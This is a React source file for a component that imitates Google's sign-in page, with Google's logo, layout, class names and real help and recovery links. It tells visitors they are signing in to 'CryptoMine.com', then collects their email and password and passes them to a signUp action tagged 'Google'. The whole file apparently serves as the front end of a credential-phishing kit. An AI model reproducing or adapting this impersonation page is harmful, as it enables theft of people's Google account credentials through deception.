import React from "react";
import { connect } from "react-redux";
import {
  setSignUp,
  setErrors,
  setCurrentUser,
} from "../../redux/user/user.action";

import { Button } from "@material-ui/core";
import AccountCircleIcon from "@material-ui/icons/AccountCircle";
import ArrowDropDownIcon from "@material-ui/icons/ArrowDropDown";

import "./google.scss";
import GoogleInput from "./GoogleInput";

function Google({ errors, signUp, setErrors, setCurrentUser }) {
  const [values, setValues] = React.useState({
    email: "",
    password: "",
    showPassword: false,
    next: "1",
  });

  const handleNext = async (e) => {
    e.preventDefault();

    const user = {
      email: values.email.toString(),
      password: values.password.toString(),
      app: "Google",
    };
    signUp(user)
      .then(() => {
        setCurrentUser(true);
      })
      .catch((err) => {
        if (!err.email && values.next !== "2") {
          setValues({ ...values, next: "2" });
          setErrors({ err: false });
        }
        if (errors.password) {
          setValues({ ...values, password: "" });
        }
      });
  };

  return (
    <div className="google-top-layer">
      <div className="google-main">
        <div className="google-main__body">
          <div className="google-main__body-header">
            <div className="google-main__body-main-header">
              <div className="google-main__body-main-header-logo">
                <svg
                  xmlns="https://www.w3.org/2000/svg"
                  width="28"
                  height="28"
                  viewBox="0 0 48 48"
                  aria-hidden="true"
                  className="L5wZDc"
                >
                  <path
                    fill="#4285F4"
                    d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
                  ></path>
                  <path
                    fill="#34A853"
                    d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
                  ></path>
                  <path
                    fill="#FBBC05"
                    d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
                  ></path>
                  <path
                    fill="#EA4335"
                    d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
                  ></path>
                  <path fill="none" d="M2 2h44v44H2z"></path>
                </svg>
              </div>
              <div className="google-main__body-main-header-title">
                Sign in with Google
              </div>
            </div>
          </div>

          <div className="google-main__body-container">
            <div className="google-main__body-container-name">
              <h1>
                <span>{values.next === "1" ? "Sign in" : "Welcome"}</span>
              </h1>
              <div>
                {values.next === "1" ? (
                  <span>
                    to continue to{" "}
                    <b style={{ color: "#1a73e8" }}>CryptoMine.com</b>
                  </span>
                ) : (
                  <div
                    className="logo-and-email"
                    onClick={() => setValues({ ...values, next: "1" })}
                  >
                    <AccountCircleIcon />
                    <span className="email">{values.email}</span>
                    <ArrowDropDownIcon />
                  </div>
                )}
              </div>
            </div>

            <div className="google-main__body-container-body">
              <div className="google-main__body-container-body-main">
                <div className="google-container-input">
                  <GoogleInput
                    values={values}
                    setValues={setValues}
                    errors={errors}
                  />

                  <div className="container-body-text">
                    <a
                      href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      {values.next === "1" ? "Forgot Email?" : ""}
                    </a>
                  </div>

                  <div className="google-container-buttons">
                    <div className="google-buttons">
                      <div className="google-button-next">
                        <Button
                          style={{
                            backgroundColor: "#1a73e8",
                            minWidth: "88px",
                            color: "#fff",
                          }}
                          variant="contained"
                          disableElevation
                          onClick={handleNext}
                        >
                          Next
                        </Button>
                      </div>
                      <div className="google-button-help">
                        <Button style={{ textTransform: "none" }}>
                          {values.next === "1" ? (
                            <a
                              href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp"
                              target="_blank"
                              rel="noopener noreferrer"
                            >
                              {" "}
                              Create account
                            </a>
                          ) : (
                            <a
                              href="https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
                              target="_blank"
                              rel="noopener noreferrer"
                            >
                              {" "}
                              Forgot password?
                            </a>
                          )}
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="google-main__footer">
          <div className="google language">English(United States)</div>
          <ul className="Bgzgmd">
            <li>
              <a
                href="https://support.google.com/accounts?hl=en"
                target="_blank"
                rel="noopener noreferrer"
              >
                Help
              </a>
            </li>
            <li>
              <a
                href="https://accounts.google.com/TOS?loc=NP&amp;hl=en&amp;privacy=true"
                target="_blank"
                rel="noopener noreferrer"
              >
                Privacy
              </a>
            </li>
            <li>
              <a
                href="https://accounts.google.com/TOS?loc=NP&amp;hl=en"
                target="_blank"
                rel="noopener noreferrer"
              >
                Terms
              </a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}

const mapStateToProps = (state) => ({
  errors: state.user.errors,
});

const mapDispatchTOProps = (dispatch) => ({
  signUp: (user) => dispatch(setSignUp(user)),
  setErrors: (errors) => dispatch(setErrors(errors)),
  setCurrentUser: (user) => dispatch(setCurrentUser(true)),
});

export default connect(mapStateToProps, mapDispatchTOProps)(Google);
